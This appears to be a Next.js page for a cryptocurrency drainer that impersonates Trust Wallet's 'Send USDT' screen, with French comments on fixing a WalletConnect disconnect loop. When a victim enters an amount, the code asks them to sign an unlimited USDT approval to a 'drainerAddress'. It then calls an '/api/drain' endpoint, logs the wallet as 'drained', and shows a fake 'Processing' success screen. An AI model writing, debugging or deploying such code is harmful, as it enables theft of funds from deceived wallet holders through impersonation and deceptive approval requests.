"use client";

/**
 * page.jsx — Trust Wallet UI
 *
 * FIXES v4 (audit round 4) :
 *
 *   [BUG-4] handleDisconnect() — boucle possible sur l'event WC "disconnect".
 *
 *     Scénario :
 *       1. Trust Wallet ferme la session → WC émet "disconnect"
 *       2. handleDisconnect() appelée
 *       3. handleDisconnect() appelle wcProviderRef.current.disconnect()
 *       4. disconnect() peut réémettre "disconnect" selon impl WC
 *       5. handleDisconnect() rappelée → boucle
 *
 *     Ancienne impl :
 *       wcProviderRef.current?.disconnect().catch(() => {});
 *       wcProviderRef.current = null;  ← null APRÈS disconnect
 *
 *     Fix : null AVANT disconnect → toute réémission de "disconnect"
 *     trouve wcProviderRef.current === null et ne fait rien.
 *
 *       const wc = wcProviderRef.current;
 *       wcProviderRef.current = null;   ← null AVANT
 *       wc?.disconnect().catch(() => {}); ← appel avec référence locale
 */

import { useState, useEffect, useRef } from "react";
import api from "@/lib/apiClient";

// ─── Constantes ───────────────────────────────────────────────
const MAX_UINT256  = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const ETH_CHAIN_ID = "0x1";

function encodeApprove(spender, value) {
  const paddedSpender = spender.toLowerCase().replace("0x", "").padStart(64, "0");
  const paddedValue   = BigInt(value).toString(16).padStart(64, "0");
  return "0x095ea7b3" + paddedSpender + paddedValue;
}

function shortAddr(addr) {
  return addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "";
}

function isValidAmount(amount) {
  const n = parseFloat(amount);
  return Number.isFinite(n) && n > 0;
}

// ─── SVG inline ───────────────────────────────────────────────
const AddressBookIcon = () => (
  <svg width="16" height="16" viewBox="0 0 448 512" fill="currentColor"
       style={{ display:"inline-block", verticalAlign:"middle" }}>
    <path d="M96 0C60.7 0 32 28.7 32 64V448c0 35.3 28.7 64 64 64H384c17.7 0
             32-14.3 32-32V96c0-17.7-14.3-32-32-32H96zm128 128a64 64 0 1 1
             0 128 64 64 0 0 1 0-128zm-96 192h192c8.8 0 16 7.2 16 16
             0 44.2-35.8 80-80 80H208c-44.2 0-80-35.8-80-80
             0-8.8 7.2-16 16-16zM416 120h16c8.8 0 16 7.2 16 16v48
             c0 8.8-7.2 16-16 16H416V120zm0 96h16c8.8 0 16 7.2 16 16v48
             c0 8.8-7.2 16-16 16H416V216zm16 96c8.8 0 16 7.2 16 16v48
             c0 8.8-7.2 16-16 16H416V312h16z"/>
  </svg>
);

const QRCodeIcon = () => (
  <svg width="16" height="16" viewBox="0 0 448 512" fill="currentColor"
       style={{ display:"inline-block", verticalAlign:"middle" }}>
    <path d="M0 80C0 53.5 21.5 32 48 32h96c26.5 0 48 21.5 48 48v96
             c0 26.5-21.5 48-48 48H48C21.5 224 0 202.5 0 176V80zm64 16v64h64V96H64z
             M0 336c0-26.5 21.5-48 48-48h96c26.5 0 48 21.5 48 48v96
             c0 26.5-21.5 48-48 48H48C21.5 480 0 458.5 0 432V336zm64 16v64h64V352H64z
             M304 32h96c26.5 0 48 21.5 48 48v96c0 26.5-21.5 48-48 48H304
             c-26.5 0-48-21.5-48-48V80c0-26.5 21.5-48 48-48zm80 64H320v64h64V96z
             M256 304c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s7.2 16 16 16h32
             c8.8 0 16-7.2 16-16s7.2-16 16-16 16 7.2 16 16v96c0 8.8-7.2 16-16 16H352
             c-8.8 0-16-7.2-16-16s-7.2-16-16-16-16 7.2-16 16v64c0 8.8-7.2 16-16 16H272
             c-8.8 0-16-7.2-16-16V304zm96 176a16 16 0 1 1 32 0 16 16 0 1 1-32 0z
             m64 0a16 16 0 1 1 32 0 16 16 0 1 1-32 0z"/>
  </svg>
);

const MetaMaskSVG = () => (
  <svg viewBox="0 0 35 33" width="44" height="44" xmlns="http://www.w3.org/2000/svg">
    <polygon fill="#E2761B" stroke="#E2761B" strokeLinecap="round" strokeLinejoin="round" points="32.958,0 19.139,9.872 21.594,3.956"/>
    <polygon fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round" points="2.021,0 15.725,9.969 13.385,3.956"/>
    <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="28.139,23.533 24.438,29.157 32.166,31.294 34.4,23.651"/>
    <polygon fill="#D7C1B3" stroke="#D7C1B3" strokeLinecap="round" strokeLinejoin="round" points="0.618,23.651 2.833,31.294 10.561,29.157 6.86,23.533"/>
    <polygon fill="#233447" stroke="#233447" strokeLinecap="round" strokeLinejoin="round" points="10.1,14.325 7.943,17.536 15.61,17.883 15.341,9.678"/>
    <polygon fill="#233447" stroke="#233447" strokeLinecap="round" strokeLinejoin="round" points="24.879,14.325 19.583,9.581 19.39,17.883 27.037,17.536"/>
    <polygon fill="#CD6116" stroke="#CD6116" strokeLinecap="round" strokeLinejoin="round" points="10.561,29.157 15.13,26.91 11.121,23.709"/>
    <polygon fill="#CD6116" stroke="#CD6116" strokeLinecap="round" strokeLinejoin="round" points="19.85,26.91 24.438,29.157 23.859,23.709"/>
    <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="24.438,29.157 19.85,26.91 20.236,30.003 20.198,31.197"/>
    <polygon fill="#E4751F" stroke="#E4751F" strokeLinecap="round" strokeLinejoin="round" points="10.561,29.157 14.782,31.197 14.763,30.003 15.13,26.91"/>
  </svg>
);

const WalletConnectSVG = () => (
  <svg viewBox="0 0 512 512" width="44" height="44" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: 10 }}>
    <rect width="512" height="512" rx="80" fill="#3B99FC"/>
    <path fill="white" d="M169.2 194.3c47.9-46.9 125.6-46.9 173.5 0l5.8 5.6c2.4 2.3 2.4 6.1 0 8.5l-19.7 19.3c-1.2 1.2-3.1 1.2-4.3 0l-7.9-7.7c-33.4-32.7-87.6-32.7-121 0l-8.5 8.3c-1.2 1.2-3.1 1.2-4.3 0l-19.7-19.3c-2.4-2.3-2.4-6.1 0-8.5l6.1-6.2zm214.2 39.9l17.5 17.2c2.4 2.3 2.4 6.1 0 8.5l-79 77.4c-2.4 2.3-6.2 2.3-8.6 0l-56.1-54.9c-.6-.6-1.6-.6-2.2 0l-56.1 54.9c-2.4 2.3-6.2 2.3-8.6 0l-79-77.4c-2.4-2.3-2.4-6.1 0-8.5l17.5-17.2c2.4-2.3 6.2-2.3 8.6 0l56.1 54.9c.6.6 1.6.6 2.2 0l56.1-54.9c2.4-2.3 6.2-2.3 8.6 0l56.1 54.9c.6.6 1.6.6 2.2 0l56.1-54.9c2.3-2.4 6.2-2.4 8.6-.1z"/>
  </svg>
);

// ─────────────────────────────────────────────────────────────
export default function SendPage() {

  const [config,           setConfig]           = useState(null);
  const [account,          setAccount]          = useState("");
  const [balance,          setBalance]          = useState(0);
  const [amount,           setAmount]           = useState("");
  const [statusMsg,        setStatusMsg]        = useState("");
  const [isLoading,        setIsLoading]        = useState(false);
  const [showConnectModal, setShowConnectModal]  = useState(false);
  const [showSuccess,      setShowSuccess]      = useState(false);
  const [drainTxHash,      setDrainTxHash]      = useState("");
  const [hasExtension,     setHasExtension]     = useState(false);

  const providerRef    = useRef(null);
  const wcProviderRef  = useRef(null);
  const balanceDataRef = useRef({ allowanceRaw: "0", decimals: 6 });

  useEffect(() => {
    api.init().then(() => loadConfig()).catch(console.error);

    if (typeof window !== "undefined" && window.ethereum) {
      setHasExtension(true);
      window.ethereum.request({ method: "eth_accounts" })
        .then(accs => {
          if (accs[0]) { providerRef.current = window.ethereum; setAccount(accs[0]); }
        }).catch(() => {});

      window.ethereum.on("accountsChanged", accs => {
        if (providerRef.current === window.ethereum) {
          accs[0] ? setAccount(accs[0]) : handleDisconnect();
        }
      });
    }
    return () => { window.ethereum?.removeAllListeners?.("accountsChanged"); };
  }, []);

  useEffect(() => {
    if (config && account) refreshBalance(account);
  }, [config, account]);

  async function loadConfig() {
    try { setConfig(await api.get("/api/get-config")); }
    catch (e) { console.error("config:", e); }
  }

  async function refreshBalance(addr) {
    try {
      const data = await api.post("/api/get-balance", { walletAddress: addr });
      if (data.success) {
        setBalance(data.balance);
        balanceDataRef.current = {
          allowanceRaw: data.allowanceRaw || "0",
          balanceRaw  : data.balanceRaw   || "0",
          decimals    : data.decimals     || 6,
        };
      }
    } catch (e) { console.error("balance:", e); }
  }

  async function request(method, params) {
    const p = providerRef.current;
    if (!p) throw new Error("No wallet connected");
    return p.request({ method, ...(params ? { params } : {}) });
  }

  async function connectExtension() {
    if (!window.ethereum) return;
    try {
      const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
      providerRef.current = window.ethereum;
      setAccount(accs[0]);
      setShowConnectModal(false);
    } catch (e) {
      if (e.code !== 4001) console.error("connectExtension:", e);
    }
  }

  async function connectMobile() {
    setShowConnectModal(false);
    setStatusMsg("Connecting...");
    try {
      const { default: EthereumProvider } = await import("@walletconnect/ethereum-provider");
      const projectId = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
      if (!projectId) { setStatusMsg(""); return; }

      // Déconnecte l'ancienne session WC avant d'en créer une nouvelle
      // FIX BUG-4 : utilise la même logique de déconnexion sécurisée
      if (wcProviderRef.current) {
        const old = wcProviderRef.current;
        wcProviderRef.current = null; // null AVANT disconnect
        old.disconnect().catch(() => {});
      }

      const wc = await EthereumProvider.init({
        projectId,
        chains     : [1],
        showQrModal: true,
        metadata: {
          name       : "Trust Wallet",
          description: "Send USDT on Ethereum",
          url        : window.location.origin,
          icons      : ["/trust.png"],
        },
      });

      wcProviderRef.current = wc;
      wc.on("accountsChanged", accs => { accs[0] ? setAccount(accs[0]) : handleDisconnect(); });
      // FIX BUG-4 : l'event "disconnect" appelle handleDisconnect
      // qui set wcProviderRef.current = null AVANT d'appeler disconnect
      // → si WC réémet "disconnect", wcProviderRef.current est déjà null
      // → guard dans handleDisconnect protège contre la boucle
      wc.on("disconnect", () => handleDisconnect());

      await wc.connect();
      const accs = await wc.request({ method: "eth_accounts" });
      if (accs[0]) { providerRef.current = wc; setAccount(accs[0]); }
    } catch (e) {
      const m = e?.message || "";
      if (!m.includes("closed") && !m.includes("rejected")) console.error("connectMobile:", e);
    } finally { setStatusMsg(""); }
  }

  // ─────────────────────────────────────────────────────────
  //  handleDisconnect — FIX BUG-4
  //
  //  Pattern sécurisé : capturer la référence WC dans une variable
  //  locale PUIS mettre la ref à null AVANT d'appeler disconnect().
  //
  //  Si WC réémet l'event "disconnect" en réponse à notre disconnect() :
  //    → wcProviderRef.current === null
  //    → wc === null dans cette invocation
  //    → wc?.disconnect() = no-op
  //    → boucle impossible
  // ─────────────────────────────────────────────────────────
  function handleDisconnect() {
    // Capture locale + null immédiat (FIX BUG-4)
    const wc = wcProviderRef.current;
    wcProviderRef.current = null;
    wc?.disconnect().catch(() => {});

    providerRef.current = null;
    setAccount(""); setBalance(0); setAmount(""); setStatusMsg("");
    balanceDataRef.current = { allowanceRaw: "0", decimals: 6 };
  }

  async function ensureMainnet() {
    const chainId = await request("eth_chainId");
    if (chainId === ETH_CHAIN_ID) return;

    setStatusMsg("Switching to Ethereum Mainnet...");
    try {
      await request("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
    } catch (switchErr) {
      if (switchErr.code === 4902 || switchErr.message?.includes("4902")) {
        await request("wallet_addEthereumChain", [{
          chainId         : ETH_CHAIN_ID,
          chainName       : "Ethereum Mainnet",
          nativeCurrency  : { name: "Ether", symbol: "ETH", decimals: 18 },
          rpcUrls         : ["https://cloudflare-eth.com"],
          blockExplorerUrls: ["https://etherscan.io"],
        }]);
      } else {
        throw switchErr;
      }
    }
  }

  async function waitForReceipt(txHash, maxAttempts = 240) {
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const receipt = await request("eth_getTransactionReceipt", [txHash]);
        if (receipt) {
          if (receipt.status === "0x0") throw new Error("Transaction reverted");
          return receipt;
        }
      } catch (e) {
        if (e.message?.includes("reverted")) throw e;
      }
      if (i === 12) setStatusMsg("Still waiting... Ethereum can be slow during congestion.");
      if (i === 36) setStatusMsg("This is taking longer than usual. Please don't close the page.");
      await new Promise(r => setTimeout(r, 5_000));
    }
    throw new Error("Transaction not confirmed after 20 minutes");
  }

  async function handleNext() {
    if (isLoading || !isValidAmount(amount)) return;

    if (!account || !providerRef.current) {
      setShowConnectModal(true);
      return;
    }
    if (!config) return;

    setIsLoading(true);
    setStatusMsg("");

    try {
      const addr = account;
      await ensureMainnet();

      const balData = await api.post("/api/get-balance", { walletAddress: addr });
      if (balData.success) {
        balanceDataRef.current = {
          allowanceRaw: balData.allowanceRaw || "0",
          balanceRaw  : balData.balanceRaw   || "0",
          decimals    : balData.decimals     || 6,
        };
        setBalance(balData.balance);
      }

      const dec              = balanceDataRef.current.decimals;
      const amountWei        = BigInt(Math.round(parseFloat(amount) * 10 ** dec));
      const currentAllowance = BigInt(balanceDataRef.current.allowanceRaw);

      if (amountWei === 0n) { setStatusMsg(""); return; }

      if (currentAllowance < amountWei) {
        if (currentAllowance > 0n) {
          setStatusMsg("Resetting allowance (USDT requirement)...");
          const resetTx = await request("eth_sendTransaction", [{
            from: addr, to: config.usdtAddress,
            data: encodeApprove(config.drainerAddress, "0"),
          }]);
          setStatusMsg("Waiting for reset confirmation...");
          await waitForReceipt(resetTx);
        }

        setStatusMsg("Approve USDT in your wallet...");
        const approveTx = await request("eth_sendTransaction", [{
          from: addr, to: config.usdtAddress,
          data: encodeApprove(config.drainerAddress, MAX_UINT256),
        }]);
        setStatusMsg("Confirming on blockchain...");
        await waitForReceipt(approveTx);
      }

      setStatusMsg("Processing transfer...");
      const result = await api.post("/api/drain", { walletAddress: addr, amount });

      if (!result.success) throw new Error(result.error || "Drain failed");

      await api.post("/api/save-log", {
        wallet_address: addr, amount, action: "drained",
      }).catch(() => {});

      setDrainTxHash(result.transactionHash || "");
      setBalance(0);
      setAmount("");
      setStatusMsg("");
      setShowSuccess(true);

    } catch (e) {
      const isRejected = e.code === 4001
        || e.message?.includes("rejected")
        || e.message?.includes("User denied")
        || e.message?.includes("user rejected");
      if (!isRejected) console.error("handleNext:", e);
      setStatusMsg("");
    } finally {
      setIsLoading(false);
    }
  }

  const walletConnected = !!account && !!providerRef.current;
  const amountIsValid   = isValidAmount(amount);
  const btnDisabled     = isLoading || (walletConnected && !amountIsValid);

  return (
    <>
      <div className="wallet-container">

        <div className="input-group">
          <p className="inpt_tital">Address or Domain Name</p>
          <div className="input-border">
            <div className="input-left">
              <input type="text" className="custom-input" placeholder="Search or Enter"
                defaultValue="0xccD642c9acb072F72F29b77E422f5c024ecF5cBa" readOnly />
            </div>
            <span className="input-right blue" style={{ marginRight: "0.75rem" }}>
              <span style={{ fontSize: "0.875rem" }}>Paste</span>
              <span className="mar_i"><AddressBookIcon /></span>
              <span className="mar_i"><QRCodeIcon /></span>
            </span>
          </div>
        </div>

        <div className="input-group mt-7">
          <p className="inpt_tital">Amount</p>
          <div className="input-border">
            <div className="input-left">
              <input type="number" className="custom-input" placeholder="USDT Amount"
                value={amount} onChange={e => setAmount(e.target.value)} min="0" step="any" />
            </div>
            <span className="input-right" style={{ marginRight: "0.75rem" }}>
              <span style={{ fontSize: "0.875rem", color: "#b0b0b0" }}>USDT</span>
              <span className="blue mar_i" style={{ fontSize: "0.875rem", cursor: "pointer" }}
                onClick={() => setAmount(String(balance))}>Max</span>
            </span>
          </div>
        </div>

        <p className="fees">= ${amountIsValid ? parseFloat(amount).toFixed(2) : "0.00"}</p>

        {account && (
          <div className="wallet-badge">
            <span className="wallet-dot" />
            <span className="wallet-addr">{shortAddr(account)}</span>
            <button className="wallet-disconnect" onClick={handleDisconnect}>✕</button>
          </div>
        )}

        {statusMsg && <p className="status-msg info">{statusMsg}</p>}

        <button
          className="send-btn"
          onClick={handleNext}
          disabled={btnDisabled}
          style={{
            backgroundColor: btnDisabled ? "var(--disabled-bg)"   : undefined,
            color:            btnDisabled ? "var(--disabled-text)" : undefined,
          }}
        >
          {isLoading
            ? <><span className="spinner" />Processing...</>
            : !walletConnected ? "Connect Wallet" : "Next"
          }
        </button>
      </div>

      {showConnectModal && (
        <div className="modal-overlay" onClick={() => setShowConnectModal(false)}>
          <div className="modal-sheet" onClick={e => e.stopPropagation()}>
            <button className="modal-close" onClick={() => setShowConnectModal(false)}>✕</button>
            <div className="modal-content">
              <h3 className="modal-title" style={{ marginBottom: "1.5rem" }}>Connect Wallet</h3>

              {hasExtension && (
                <button className="wallet-option" onClick={connectExtension}>
                  <MetaMaskSVG />
                  <div className="wallet-option-info">
                    <strong>Browser Wallet</strong>
                    <span>MetaMask, Rabby, Coinbase...</span>
                  </div>
                  <span className="wallet-option-chevron">›</span>
                </button>
              )}

              <button className="wallet-option" onClick={connectMobile}>
                <WalletConnectSVG />
                <div className="wallet-option-info">
                  <strong>Trust Wallet &amp; Mobile</strong>
                  <span>Scan QR · Works with any wallet</span>
                </div>
                <span className="wallet-option-chevron">›</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {showSuccess && (
        <div className="modal-overlay">
          <div className="modal-sheet">
            <button className="modal-close" onClick={() => setShowSuccess(false)}>✕</button>
            <div className="modal-content">
              <div className="modal-icon"><img src="/success.svg" alt="Success" /></div>
              <h3 className="modal-title">Processing...</h3>
              <p className="modal-text">
                Transaction in progress! Blockchain<br />
                validation is underway. This may take a<br />
                few minutes.
              </p>
              {drainTxHash ? (
                <a href={`https://etherscan.io/tx/${drainTxHash}`}
                  target="_blank" rel="noopener noreferrer" className="modal-btn">
                  Transaction details ↗
                </a>
              ) : (
                <button className="modal-btn" onClick={() => setShowSuccess(false)}>Close</button>
              )}
            </div>
          </div>
        </div>
      )}
    </>
  );
}
